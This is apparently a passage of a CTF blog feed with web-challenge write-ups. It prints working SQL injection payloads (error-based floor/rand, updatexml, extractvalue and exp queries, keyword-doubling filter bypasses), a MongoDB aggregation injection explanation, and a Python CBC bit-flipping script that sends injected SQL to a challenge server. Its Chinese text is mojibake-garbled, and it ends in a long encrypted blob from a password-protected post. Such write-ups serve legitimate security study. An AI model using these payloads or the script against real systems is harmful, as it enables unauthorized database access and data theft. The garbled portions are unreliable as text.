<p>æˆ‘ä»¬ç»è¿‡$condç­›é€‰åå¾—åˆ°çš„categoryä¼šè¢«å½“åš_idå¹¶åœ¨ä¸‹æ–‡ä¸­å‘ˆç°å‡ºæ¥.$eq $cond $strLenBytes $toInt è¿™äº›éƒ½æ˜¯mongodbä¸­çš„å…¨å±€å˜é‡æˆ–è€…æ˜¯æ•°æ®åº“ä¸­çš„å­—æ®µå,å…¨å±€å˜é‡èµ·åˆ°çš„æ˜¯å‡½æ•°çš„ä½œç”¨,è¿™æ®µpayloadçš„æ„æ€å°±æ˜¯é¦–å…ˆå¯¹$titleè¿›è¡Œç»Ÿè®¡é•¿åº¦($strLenBytes),ç„¶åå¯¹æ•°å­—19(æ˜¯flagæ‰€åœ¨æ¡ç›®çš„titleé•¿åº¦,å¯ä»¥ä¸€ä¸ªä¸€ä¸ªæ•°å­—å»çˆ†ç ´)è¿›è¡Œå–æ•´($toInt),æœ€åæ¯”è¾ƒä»–ä»¬ä¸¤è€…æ˜¯å¦ç›¸ç­‰($eq),å¦‚æœç›¸ç­‰,å°±å°†è¿™ä¸ªæ¡ç›®çš„$textå†…å®¹èµ‹å€¼ç»™category,å¦åˆ™,å°±èµ‹å€¼12.</p>
<p>è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„,mongodbä¸­æ¯ä¸ªexpressionéƒ½å¿…é¡»è¢«ä¸€å¯¹èŠ±æ‹¬å·æ‹¬èµ·æ¥(jsonæ ¼å¼),è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆpayloadä¸­æœ‰ä¸€ä¸ªç©ºçš„ä¸­æ‹¬å·äº†<code>[]</code></p>
<p>å‚è€ƒé“¾æ¥:</p>
<p><a href="https://impakho.com/post/cybrics-ctf-2019-writeup?from=timeline" target="_blank" rel="noopener">https://impakho.com/post/cybrics-ctf-2019-writeup?from=timeline</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/toInt/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/toInt/</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/cond/index.html" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/cond/index.html</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/eq/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/eq/</a></p>
<h2 id="websec-level-4">websec level 4</h2>
<p>the database uses <code>sqlite3</code> instead of <code>mysql</code> ;</p>
<p>Given source codes as follow (leftmost two scripts)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58558693-12748280-8254-11e9-8acb-ba824cb791cd.png" alt="image"></p>
<p>And from the source code , we can recognize the exist of <code>unserialize exploit</code> , so the payload is listed on the buttom, which is generated by the php script on the right.</p>
<blockquote>
<p>In sqlite3 , you can show column_name by &quot;select sql from sqlite_master where tbl_name=â€˜table_nameâ€™ and type=â€˜tableâ€™ &quot;</p>
</blockquote>
<p>by replacing the query 's content to â€œselect password as username from usersâ€, we got a flag</p>
<h2 id="ichunqiu-ç™¾åº¦æ¯Vld">ichunqiu ç™¾åº¦æ¯Vld</h2>
<p>å…³é”®ä»£ç <code>login.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'dbmysql.class.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">    $db = <span class="keyword">new</span> mysql_db();</span><br><span class="line">    <span class="comment">//æ‰€è°“safedataå…¶å®å°±æ˜¯addslash</span></span><br><span class="line">    $username = $db-&gt;safe_data($_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $password = $db-&gt;my_md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $number = is_numeric($_POST[<span class="string">'number'</span>]) ? $_POST[<span class="string">'number'</span>] : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ³¨æ„è¿™ä¸ªè¯¡å¼‚çš„æ›¿æ¢ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥%00å’Œä¸€ä¸ªå•å¼•å·ï¼Œåœ¨addslashä¹‹åä¼šæœ‰\0\'ï¼Œç„¶åç»è¿‡è¿™ä¸ªå‡½æ•°çš„æ›¿æ¢ä¹‹åæˆä¸º\\'ï¼Œå¯ä»¥å®ç°é€ƒé€¸ã€‚</span></span><br><span class="line">    $username = trim(str_replace($number, <span class="string">''</span>, $username));</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from"</span>.<span class="string">"`"</span>.table_name.<span class="string">"`"</span>.<span class="string">"where username="</span>.<span class="string">"'"</span>.<span class="string">"$username"</span>.<span class="string">"'"</span>;</span><br><span class="line">    $row = $db-&gt;query($sql);</span><br><span class="line">    $result = $db-&gt;fetch_array($row);</span><br><span class="line">    <span class="keyword">if</span>($row)&#123;</span><br><span class="line">        <span class="keyword">if</span>($result[<span class="string">"number"</span>] === $number &amp;&amp; $result[<span class="string">"password"</span>] === $password)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('nothing here!')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;</span></span><br><span class="line"><span class="string">            alert('å¯†ç é”™è¯¯ï¼Œè€å¸æœºç¿»è½¦äº†!');</span></span><br><span class="line"><span class="string">            function jumpurl()&#123;</span></span><br><span class="line"><span class="string">                location='login.html';</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            setTimeout('jumpurl()',1000);</span></span><br><span class="line"><span class="string">            &lt;/script&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(mysql_error());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;</span></span><br><span class="line"><span class="string">            alert('ç”¨æˆ·åå¯†ç ä¸èƒ½ä¸ºç©º!');</span></span><br><span class="line"><span class="string">            function jumpurl()&#123;</span></span><br><span class="line"><span class="string">                location='login.html';</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            setTimeout('jumpurl()',1000);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),database())x from information_schema.tables group by x )a) ;%23&amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select table_name from information_schema.tables where table_schema=database() limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select column_name from information_schema.columns where table_schema=database() limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select flag from ctf.flag limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ps:group_concat å¯èƒ½é‡åˆ°æœªçŸ¥é—®é¢˜</p>
</blockquote>
<p>updatexml:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and updatexml(1,(select mid(concat(1,group_concat(flag)),1,64) from ctf.flag),1)%23&amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<p>æŠ¥é”™ä½æ•°æœ‰é™ï¼Œåç§»ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p>
<p>æ³¨æ„ï¼šgroup_concat ä¹‹å‰ä¸åŠ ä¸œè¥¿å¯èƒ½è¯»ä¸å…¨ï¼Œå¦‚ä¸‹</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57983217-e271f600-7a81-11e9-9dd5-d087a09c7716.png" alt="image"></p>
<h2 id="å¤šæ¬¡">å¤šæ¬¡</h2>
<p>é€šè¿‡å¼‚æˆ–ç¬¦å·æ¥æ£€æµ‹æœ‰å“ªäº›ç¬¦å·è¢«è¿‡æ»¤äº†.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;</span><br><span class="line">1&quot;</span><br><span class="line">1&apos;--+</span><br><span class="line">1&quot;--+</span><br><span class="line">1&apos;^(0)--+</span><br><span class="line">1&apos;^(1)--+</span><br><span class="line">1&apos;^(length(&apos;select&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;union&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;or&apos;)&gt;0)--+</span><br><span class="line">.........</span><br><span class="line">-1&apos; uniunionon selselectect 1,2 --+</span><br><span class="line">-1&apos; uniunionon selselectect 1,database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;flag1&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;hint&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(flag1,&quot; :: &quot;,address) from flag1--+</span><br></pre></td></tr></table></figure>
<p>and we get the second address</p>
<h2 id="ichunqiu-SQL">ichunqiu SQL</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.ichunqiu.com/battalion?q=2619</span><br><span class="line">https://www.ichunqiu.com/writeup/detail/1845</span><br></pre></td></tr></table></figure>
<p>å…³äºä¸ºä»€ä¹ˆä¸éœ€è¦é—­åˆçš„åŸå› ï¼Œå› ä¸ºæ˜¯idï¼Œidæ˜¯intç±»å‹çš„ï¼Œé»˜è®¤æƒ…å†µä¸‹å°±æ˜¯where id=(æ•°å­—)ï¼Œå› æ­¤ä¸éœ€è¦é—­åˆï¼Œé™¤éæœ‰é¢å¤–å¤„ç†ï¼Œéƒ½æ˜¯è¦è¯•å‡ºæ¥çš„</p>
<blockquote>
<p>å°æ’å…¥ï¼šåœ¨mysql5.7 ä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼Œselect from users limit 1 union select from (select 1)a join (select 2)b join (select 3)c;å·²ç»ä¸èƒ½ä½¿ç”¨äº†ï¼›<br>
å–è€Œä»£ä¹‹çš„æ˜¯ï¼š(select from users limit 1) union (select from (select 1)a join (select 2)b join (select 3)c);</p>
</blockquote>
<h2 id="shiyan-club-login-background">shiyan-club login background</h2>
<p>we can detect that many keywords are filtered,like â€˜unionâ€™, â€˜=â€™(so use â€˜regexpâ€™),â€™substrâ€™,â€™midâ€™,and so on.</p>
<p>based on exp-error</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema regexp database())a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(colunm_name) from informaion_schema.columns where table_name regexp &apos;ffll44jj&apos;)a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(value) from ff1144jj)a))) or &apos;</span><br></pre></td></tr></table></figure>
<p>based on xml-error</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlupdate and extractvalue</span><br><span class="line"></span><br><span class="line">username=1&apos; or/*&amp;password=&apos;*/extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*this require did not work</span><br><span class="line"></span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*but the responce is &quot;SELECT command denied to user &apos;web8&apos;@&apos;localhost&apos; for table &apos;tables&apos;&quot;</span><br><span class="line">/*syntax error*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*works but strangly , the first table_name do not show*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())))or&apos;</span><br><span class="line">/*works and show all the table_name*/</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1)or&apos;</span><br><span class="line">/*works ,same problem happend when delete &apos;0x7e&apos;*/</span><br></pre></td></tr></table></figure>
<h2 id="shiyanbar-ç™»é™†ä¸€ä¸‹å¥½å—ï¼Ÿ">shiyanbar ç™»é™†ä¸€ä¸‹å¥½å—ï¼Ÿ</h2>
<p>payload1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:&apos;=&apos;</span><br><span class="line">password:&apos;=&apos;</span><br><span class="line">è¯­å¥ä¸ºï¼šselect flag from xxx where username=&apos;&apos;=&apos;&apos; and password=&apos;&apos;=&apos;&apos;;</span><br></pre></td></tr></table></figure>
<p>payload2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:b&apos;+0;%00</span><br><span class="line">username åœ¨burpsuiteä¸­æ”¹ï¼Œ%00åœ¨burpsuiteä¸­æ˜¯%2500,å˜æˆ%00,å…¶ä»–ä¸å˜å°±å¯ä»¥äº†</span><br><span class="line">password:1</span><br><span class="line"># è¯­å¥ä¸ºï¼šselect flag from xxx where username=&apos;a&apos;+0;%00&apos;and password=&apos;1&apos;;</span><br></pre></td></tr></table></figure>
<h2 id="cbc-å­—èŠ‚ç¿»è½¬æ”»å‡»æ³¨å…¥">cbc å­—èŠ‚ç¿»è½¬æ”»å‡»æ³¨å…¥</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def denglu(payload,idx,c1,c2):</span><br><span class="line">    url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line">    payload = &#123;&apos;id&apos;: payload&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    Set_Cookie=r.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">    iv=re.findall(r&quot;iv=(.*?),&quot;, Set_Cookie)[0]</span><br><span class="line">    cipher=re.findall(r&quot;cipher=(.*)&quot;, Set_Cookie)[0]</span><br><span class="line">    iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">    cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">    lst=list(cipher_raw)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    cipher_new=&apos;&apos;.join(lst)</span><br><span class="line">    cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">    cookie_new=&#123;&apos;iv&apos;: iv,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    cont=r.content</span><br><span class="line">    plain = re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;, cont)[0]</span><br><span class="line">    plain = b64decode(plain)</span><br><span class="line">    first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">    iv_new=&apos;&apos;</span><br><span class="line">    for i in range(16):</span><br><span class="line">        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">    cookie_new = &#123;&apos;iv&apos;: iv_new, &apos;cipher&apos;: cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    rcont = r.content</span><br><span class="line">    print rcont</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">denglu(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)</span><br><span class="line">denglu(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>å¤‡å¿˜å½•[working]</title>
    <url>/2019/09/07/%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="b1bf070e397ddd3b3bbe2eafef71a72c54ce57f41a6f129f01a2fe55a9c77837">ee222498c94e3d64698639844edb3cf8d015b0ef524e1aa04d472a36d8d313c905980106b165f474cc8adbecf149d88f8ca2736d35c240a69353c365a4065b477bfc5aa472fb29eb5137425fd9be79272a33990b26d7ff67b9fb839445a4eac3088cc3950eb937835cee5a1d3cceac38325ecef4f820f7624f7fe8084b852809cb75668178255be5d6d455ca94e9d8f2f25742070bb9d86d5a8f498707ac8b95ef368df90b37b74b5ac9b7f5616451821c09ad23d9e87e8ab0a73818bdc5d929eda7fda714c7f1e7cc54449d733ecad2818c74b1abd006aeb48a2f1c571bf0505520390039d290ca0333f40ce5bc9dda1e20dc8fd4a0be1e9aeb8aaef1b69f572b3d1fedd2506b3b8c2b95d90ae50b182347d6375b3b90203bba921400b9c996f8f64a6f14f2ee732066e74a7c7acb058ab32e700fd6c75dc3053c88dfee2aee22925d944bfbbf0bf50a679ddb0cefcba9bbb69ed4d1dafada743ebffe9db1f1f38a5a9db2ecc217763167ea980cec74141b75bd0dff5c0f3b25d8672772133376db70930c5c4bfc01100f1f3b984f1dcf9a696734cd82a6a98dcf3244aa0f5698b95e9f3281610df4dd32fe8a813577adee2fb37c973519ba6b01892c91c0f539b95f54984607c4c73443a2af4f15346fa8ef029b74bc49ac452d529e57b71bb7162d76a1cd0656b5fd8bcecbf114a4395f7fe81f09cd967b6f5c18f60ed4825ae2b8932cb97b233bb500c165b228a62ffa08867fe9e151d36f4bc6f50ba44294d8fb2c608f29c34b55cc69ea86edb8e222c41fd5c754c51081f22ee0a1bf29ad386fe350d91c5365f5d8cf72ffd69191740a8bb31955cfb0b3471c3edd32578211340f4a9cbac24a276de8a46a7b74206a7ce8c5a58b8210667b1551ae82461b70e66ec46e91d4f2be96e6d58dbdc27d7c3edbc3dadc4f00da02796e3d38993ed727f77450b350850cefdd255176f9404ee3988e3301534e1b905352d120822af071eff72c302d8b8558b61c91cb9c4f6859352b430502c9ba5669061cb0171f7db5c04e9b07b4bd289a00154030d831a152d99b145f409f314b031ca34666feef412d122cc4f78f48b1676bbe899bd02bbbe3c29a9d09405463be4a263458a84c3c64c00eec6df965d4aa85e78bb39958cc2d00dd7d08c75aa3506f93d4f62e8bb20101c14481c98a0459e18c107320441e666a2a8d1dd450fcd80168f1c8e8be51d5eca10d986020f87277408415cf508fd25fe1d426532a6a23a1ae08a12a53900ee175b1ef23bdb2a345a920d07e3029fd1a1e3f542a5168618deef06af39eab6a5e8126a79ed42ba14e8979dea755320ebafc8953f41e764b471bf51a1faafea6b7f1190a09b4c3b46815dda8949f2dfdc92dbf2316ddb6488abd6c4960386cad728bfb1bcbb264343515816efa2e265aedf55008e7da559ab133da14527485842791be56105060a7b714878ce76b78594bb5b471f240656eb93acaba03c8154412a0f7b7a98810e1d7e442a7c5afae1ff9e6e220557822522be4d2eff786f543b7bdec9840d3bfdd8dedec54586f4be9e0973e00ab9ece50d70d118038450107354519253c0622a6cdac4bf7f884d46abd52fab4b7c83f31f25004764e0172fecc5b2bc9a7bad7d4dc38326bbb67cd3b0b0cb9231a058bb6abb36d7cc096d41dc73023aa8f3f94a7aa2b3537e2e0debf50e5d069fa0f5486acddbf5eea9d35752b10c149eb0c8de610fca4dc4c43c2433dce1f916628de09a8242e198445119a6ef237e9d1ae5dcc3fd167ce9f703dbc22a16f0f94cb48de77a2d630d09c1cf5f3a32d5e1cd27bab2930316eb39a1714ee0ffe0e8c3f87d8bcb34300a2a85ce51f6dc93bfa28bcdca840db7e2f97096e2a4581a926a97ae6e6c166168f8f44af65039e06ee082e761e63eeff4e466ddd0192eeb39650ffaa19b60ac6994854f11a4c4f76343126bf5e3caaa3d4b2761bb9e1c0b7b67cc3f176061fee86e6560f59f882c8c5d8758665a5219ecbfcee72ffa5d91b52e220a893fe995ae408727845d7f63e34ab7669e7dd98c9798476f2c5ae89fa7f6a710b73aa1d76474e4e872fa126da833d6becb7972ab8e8889c9443cd8d5c3567cbe714183e3792b8a5eed47725fd01208f2f3dc47c4be03d4cf85f5a1d007d96648d4375730bcdf57413d4b66fb67dc89e0fa14597f62df5601969e236df4c8f8f1800e9f418bc96ab9f1903761404f4e21d5ce8e45d7b451e1608a766ae115f21021784ba5e8b1b5a22f9d9fd1ab09251bf36c7f06eadb8bf452bb1f8a33a7000f01c353994b54b61b359de9593d3f852ac1de7b4b8b2f7154405b97728cbb8536a2c6f0d6a044b60c0fb1cbe41327614408caf4479d53123ce4c048d09f0a7219436403a98c70f33d734df0ff8079c15da7957a7a0473b54b8e7692c2566452969eac14789db11d98945957341c432cc49107d5009795abf83820118377883b811f5e9495f8e311bde46444e290010fb5bf8ad1bb1cc2e21798b2bbd82d1e353a9b01be80017dd91937ed7ea95f284c8c5b2326b4542cc4ea3b375336ad659a22c82070f22c4cab02e65300e476fa012e556931024a2a235accfbc9f7aeca0329e8adffdbc44ceadf70015f2711eae9b23dfde27aab19feacb4f420c10fe5e849a73523797e6017d0ea5e5878b2607741e17cfb19f0f7c03f016c1763b0ab1176fbf76b7cb89773b358e3b158686dac6fe42e702edac620fbc309d92aa16062db25f119c0ca33b2e20f2377c93b6740023aaf3ff1422e32f5f9855874e02aed8c5823df9210dc79283e82f413d9e66d86c8da162d6bf4211561fa40dc1bf62aca126314f88c96afd6e5397e05fa18525d900244489aa598fa57fd5ade74c568f1d56bd60fd57f1b9cbad61d89d9bbc2ef8e4c4156d5a3f2a226de765620cdae04d4c966e0fa63ec3abb8e4ac45dd124aace6b83ec8f68e2c006851f349f1644fcd21f86385b5ec67b721e0a3ef0ee3fb6b746bc24e1d02336b653bc7d29d256a7f4dfbeb23fb95ab17beeebf375250b1e24b8699a1a8b8101da515664317a7d363e2149129cc0ed570ea468c7b4bcd98f87f3bb1f6c613da3814db47b5efbee6276ebdabf0edb3a0e5263f43da17500ed2956d9fb4d8386d319e631dc82d76f992174a6a230e3f9233c5d525c788dc27043d5b8d183077788dc7bbd8c297c4e819ec486694d524b064f62695c49368079afbafcb9930d9022c6d35b775785abd52c6b6199eb585441f0e7f02c43682cbaca78860c217be177f49ae12a188b1244cabdd1d6e7ef1b252eac63b7e11aa58461e9269e7f5e7804daec2e8971c3872761032950b0074539b6c4fa6b41c0d06cb415434403f05e0f1f5f363cc6aef33e7eabcc53785c7e33338807ee2b22712ebf0e7cd1c240d3e3889bc6a19f6cf86cefb20426ac22bb329f0a75e9f4035de80fcd9ec725728f805510fcafef1fce73165f5a8ae3fac4464eaa05834018e527af71322e6bd0483f3f45f8f24a1b62fd8ad1fe654e5012cccb62f4e4456cf9cf24720c5084fc09cddf3f06c9a80b9020d69c3d03d5aab35de51a7fbc744a52778f81aa760c8fecc3d966a11901320e5c78b0b93a40eae952aebba4982aa6762c3a7e9f1453e0033b0a6bbc7d4c55c3b3c197ff9c9c24cb91e55d9cb4043a6e8b0012ed00106b92d316fbdcda09ec24b3583bf8f3403cb3d0e0b3fb6be823c20d7bc9f4d733dcd38bc80d6c881ebb8daa5aa7a6a8b21b71317b1643622014cb4fa149e4e368871726c0a4c9530ac37ecfde6b88e06b5ca8781e68bc887b7e2e02a66d87ef3133d5fcd723cc8683bbf3db6c889179a78a81ef773044846566c5909ca50cef85a5de22c9895ecf27c760d931d123c076513001345df0c88ec3acdfc4a9592725624c20206010a4d72903328bf1c21dcec55f43fc9714d8e730b118ff15de42b190c487f4873f4bc55dd1482ba5f67d837dadf2e72e981892b15dba8eff5f4658a925afa90b40375d23c91d93dda92f840887eb74be32c1b423ed0b19e7f6a4d6385ff73591c41b0bdbc4f7a8a545e291ebccff87e645a9b8149493f287caa3442016c64bce1ce604753f30d40fea6eda81a31b9cb724f0fe464bee5d7ec9780bd4511690201bcdd739d404ff23c2a12c49e6c5b4898ffc323084c1f8c80fff0d34ecd7402a2b291684bbce4d4fc38a5c93f8118b5f301dd9bfb428978782a2ce73c4a7123e7d53472cd1734ee1508ed66200f7931c43d2afdb420549d2a956bb985b880785ae79dc08343ee46d1d0977bbcaf97cce46d42a6c5283bfcc3233fd8cc48b4cbcbdca8f5b0982fd9035c184987c950b1f53eff3c369823c1c18a70391d9295b00b7f8edaca68adf186cd9fc56636bb43ea10d574d2001cb1dafcf4c83ba76aab4af98cfe8b7bd2e9bd5a98424f8d09dc871d9fd4cafb92d8456eb6cb49a8f53c8caae24c925787e847f3cd2d5503227194305f62bf122805d9a12210b6dc725dfce04d40cbf0b09ddb80d15ed713c6aff75331aa5aef74feb5e62b1da521ca9792d7516d440cd5897c430203aa18a0514e40621fb59430444bca37f1265229fa003856bd2a29d1175ec74aec2d1acb2652ffe571c686ccba8fdc34a5f50243e3970553a7b3927f4a142664979f269b8c562b706cd43c8dd80320f5ce7beafef319c8924958c57b431a9ff2a8ace500f543fe23acd8045d6e2241ac50e17e3e1e01bc1d52ba23ab3795aaaefbed5195b55a14a009dbe53ffd9f61aba4f9cd220e245e21c648f54dd17b922f4b7d983a14089735413b91cb20954a67a08b3bc1d802668a6358396937a49a65346e5c4aeff48065d836a49731dabec30b5c5810e4953551bdcf8dbddd340e548674bc28aa710488147b5db3f3cf1e5b7e38d4ca61a2e7390ab0d86cc3f9a92a183a1c007cf18fdda17471c1af6948a7db908c1e40fd081fc4ea0765600b20d5ea8630918243c7c63ea78be6b404d948a47161c41c0d62805110c09ca0deb755caaf0b3db02e4fff1c37062df24d06014cedae1ac98b5dc5412f865f1ec56f3db73c92aa19b04119803df4218f44b2ea513636c3f8699205b88fc707aa73637fe936f46db398440cd547c71c7424502af50349e3d261b763e3fc9cd2d39953020b0cb65f1c69fab0d8345e1b16a8e3a3cee25613d93aa2ba0746800c40fbc614566b776f1ea16194783c89fd0236873f3f5f4dd3ff13a4f1984b46cc5aece59f02e7cd1b15e84fc36174ecdcc4300aa9aca0ad1f9e06c7df5eb88c469442aafed6845042e64c58ac7cb7c19f5d34371d0a9296c71668634be449cc2da689f245a1a9e11a25998c6d606b22694bb70120a383f02e3d6a596734adebb8911edc1ab37595c83e23ad278847b57318aaf3ec684fd795358cae8f82b0f1605d58cfef6386237af1492ceba17ef8891bcc60a729d93642f8fe2c2a20a9897de8c0fd02129c2439de9919afe8870d57ef532c11c0b6ce2b95275dc3649f20817fc7ea7f03a03cfa3f09ef179f5105925a8a7e0d957163980bf20c6b2cbc5ac7a2d23d812afc2cc64bc5304c77253293047a637275fafc80a78a1328b85e176dd4766f9d05c44d23bce3d0fa969cf4cc89bbc1629a64f1b39cf4ec9e5812e2f0f7d6c8025af616894e7043a2ef8babf09ea8c0c5071ffe348ad2163dccd1cfa29493350b625e1fab86101068cc373a6978a34d493b638925e498116639f39450c698c4237e93533ce6c8507b8d4bb64c7daf19dd94dc6bb2fa71c6ef5c170ba335401c68381b00bf4443baab92f4ab7f33dd51fefafb47a45827505997c37ec6e97ba9994844214f2a35c13e7cefe1323c6e9b34c1f5fc9ac70fb4cf657e58ea3b383570c2de157f607df8098a904446080ae720404f6991e905baa4ae2b214c1b28481261251555943bc819e4167ee99bd9b66c39259d190315e5e1b038e62d11217cb4b57edb3951e1c3b90f3bd